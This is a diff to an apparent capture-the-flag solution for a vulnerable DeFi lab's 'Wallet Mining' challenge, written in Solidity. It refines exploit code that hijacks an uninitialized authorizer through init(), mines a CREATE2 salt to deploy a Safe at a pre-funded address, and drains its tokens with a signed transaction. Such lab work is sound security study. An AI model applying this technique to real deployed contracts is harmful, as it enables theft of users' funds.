@@ -162,15 +162,17 @@ contract WalletMiningChallenge is Test {
      */
     function test_walletMining() public checkSolvedByPlayer {
         // Constraints:
-        // User must not send a transaction even though we have their private key
+        // No on-chain tx from user (nonce stays 0), but off-chain signatures from user are allowed
         // Player can only send 1 transaction
 
         // Steps to solve Wallet Mining challenge:
-        // 1) Deploy ChallengeSolver contract to execute all necessary operations in one transaction
-        // 2) Figure out the saltNonce value and safe setup parameters that deploy the safe to the correct address
-        // 3) Deploy safe through WalletDeployer on behalf of user at expected address
-        // 4) Receive reward tokens from the wallet deployer contract and send them to the ward address
-        // 6) Sign safe transaction with users private key and recover funds from safe by sending tokens to user address
+        // 1) Deploy ChallengeSolver so all required actions occur within a single player transaction
+        // 2) Exploit improper initialization of AuthorizerUpgradeable by calling init() to authorize ChallengeSolver for (usr=this, aim=USER_DEPOSIT_ADDRESS)
+        // 3) Construct “plain 1-of-1” safe setup initializer (owners=[user], threshold=1, all optional fields zeroed)
+        // 4) Mine saltNonce so that createProxyWithNonce(cpy, initializer, saltNonce) deploys to USER_DEPOSIT_ADDRESS (CREATE2 deployer = cook address, salt derived as keccak256(abi.encodePacked(keccak256(initializer), saltNonce)))
+        // 5) Call walletDeployer.drop() to deploy the Safe at the pre-funded address and receive the incentive payout
+        // 6) Forward the incentive payout to the ward address to satisfy challenge constraints
+        // 7) Use the user’s private key to produce an off-chain signature (no user transaction) and execute a Safe transaction transferring all DVT to the user
 
         // deploy challenge solver contract to execute necessary operations in one transaction
         new ChallengeSolver(token, authorizer, walletDeployer, proxyFactory, ward, user, userPrivateKey);
@@ -218,6 +220,7 @@ contract ChallengeSolver is Test {
     error ChallengeSolver__DropFailed();
     error ChallengeSolver__SafeTokenTransferFailed();
     error ChallengeSolver__SaltNotFound();
+    error ChallengeSolver__InitNotPossible();
 
     address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
     uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;
@@ -268,20 +271,21 @@ contract ChallengeSolver is Test {
 
     // take advantage of improperly initialized AuthorizerUpgradeable contract to call init and authorize ourselves as a ward
     function _authorizeChallengeSolverAsWard() internal {
-        // check if initialization is possible
-        console.log("authorizer needsInit: ", authorizer.needsInit());
-
         // load arrays with this contracts address and USER_DEPOSIT_ADDRESS for init call
         address[] memory wards = new address[](1);
         wards[0] = address(this);
         address[] memory aims = new address[](1);
         aims[0] = USER_DEPOSIT_ADDRESS;
 
+        // check needsInit value
+        console.log("authorizer needsInit: ", authorizer.needsInit());
+
         // ensure init can still be called. If needsInit = 0 then init is locked
-        if (authorizer.needsInit() != 0) {
-            // call init to approve this contract as an authorized safe proxy deployer at USER_DEPOSIT_ADDRESS
-            authorizer.init(wards, aims);
+        if (authorizer.needsInit() == 0) {
+            revert ChallengeSolver__InitNotPossible();
         }
+        // call init to approve this contract as an authorized safe proxy deployer at USER_DEPOSIT_ADDRESS
+        authorizer.init(wards, aims);
     }
 
     // load initialization data, find required saltNonce, deploy safe proxy at desired address, and setup safe on behalf of user
@@ -307,11 +311,14 @@ contract ChallengeSolver is Test {
         uint256 saltNonce = _mineSaltNonce(initializerDataForSafeCreation);
         console.log("Matching Salt Nonce Found: ", saltNonce);
 
+        // challenge solver DVT balance before deploy
+        uint256 balanceBefore = token.balanceOf(address(this));
+
         // deploy safe proxy as an approved ward to receive deployment reward and rescue funds stuck at user deposit address
         // verify deployment succeeded and token reward was received
         if (
             !walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializerDataForSafeCreation, saltNonce)
-                || token.balanceOf(address(this)) != walletDeployer.pay()
+                || token.balanceOf(address(this)) - balanceBefore != walletDeployer.pay()
         ) {
             revert ChallengeSolver__DropFailed();
         }
@@ -325,9 +332,15 @@ contract ChallengeSolver is Test {
         address cook = address(walletDeployer.cook());
         bytes memory creationCode = proxyFactory.proxyCreationCode();
 
+        // deploymentData generation process copied directly from SafeProxyFactory
+        bytes memory deploymentData = abi.encodePacked(creationCode, uint256(uint160(cpy)));
+        // we need to use the keccak256 hash of the deploymentData
+        // create2 would typically do this internally but we are simulating the create2 process without actually deploying so we need to add a step not included in SafeProxyFactory
+        bytes32 deploymentDataHash = keccak256(deploymentData);
+
         // loop through possible saltNonces using basic safe proxy deployment values to find which saltNonce gets the proxy to deploy at the desired address
-        for (uint256 i = 0; i < 1_000_000; i++) {
-            predictedAddress = _predictDeployedAddress(cook, cpy, initializerDataForSafeCreation, i, creationCode);
+        for (uint256 i = 0; i < 100_000; i++) {
+            predictedAddress = _predictDeployedAddress(cook, initializerDataForSafeCreation, i, deploymentDataHash);
             if (predictedAddress == USER_DEPOSIT_ADDRESS) {
                 return i;
             }
@@ -338,16 +351,12 @@ contract ChallengeSolver is Test {
     // generate proxy deployment address through process that mirrors WalletDeployer flow
     function _predictDeployedAddress(
         address cook,
-        address cpy,
         bytes memory initializerDataForSafeCreation,
         uint256 saltNonce,
-        bytes memory creationCode
+        bytes32 deploymentDataHash
     ) internal pure returns (address predictedAddress) {
-        // salt and deploymentData generation process copied directly from SafeProxyFactory
+        // salt generation process copied directly from SafeProxyFactory
         bytes32 salt = keccak256(abi.encodePacked(keccak256(initializerDataForSafeCreation), saltNonce));
-        bytes memory deploymentData = abi.encodePacked(creationCode, uint256(uint160(cpy)));
-        // Create2 would typically do this internally but since we are simulating the create2 process without actually deploying, we need to take the keccak256 hash and convert to bytes32
-        bytes32 deploymentDataHash = keccak256(deploymentData);
         // simulate create2 process to predict the address that would be generated through SafeProxyFactory deployment flow
         // note: cook address is needed since create2 uses the calling address within the hash to generate the final deployment hash and deployment address (cook is the calling address in WalletDeployer flow)
         // if we used create2 to simulate the deployment process here it would wrongly use address(this) instead of cook so it is important we simulate as opposed to directly using create2 for predicting the deployment address
@@ -361,6 +370,9 @@ contract ChallengeSolver is Test {
         // load transaction data to be used in safe execTransaction call
         bytes memory safeTransactionData = abi.encodeWithSelector(token.transfer.selector, user, DEPOSIT_TOKEN_AMOUNT);
 
+        // get current safe nonce
+        uint256 currentNonce = Safe(payable(USER_DEPOSIT_ADDRESS)).nonce();
+
         // hash safe transaction data to be signed with users private key
         bytes32 safeTransactionDigest = Safe(payable(USER_DEPOSIT_ADDRESS))
             .getTransactionHash(
@@ -372,8 +384,8 @@ contract ChallengeSolver is Test {
                 0, // baseGas
                 0, // gasPrice
                 address(0), // gasToken
-                payable(address(this)), // refundReceiver
-                Safe(payable(USER_DEPOSIT_ADDRESS)).nonce()
+                payable(address(0)), // refundReceiver
+                currentNonce
             );
 
         // sign safe transaction with users private key and pack for verification by the deployed safe
@@ -391,7 +403,7 @@ contract ChallengeSolver is Test {
                 0, // baseGas
                 0, // gasPrice
                 address(0), // gasToken
-                payable(address(this)), // refundReceiver
+                payable(address(0)), // refundReceiver
                 signatures
             );
         // verify execution success
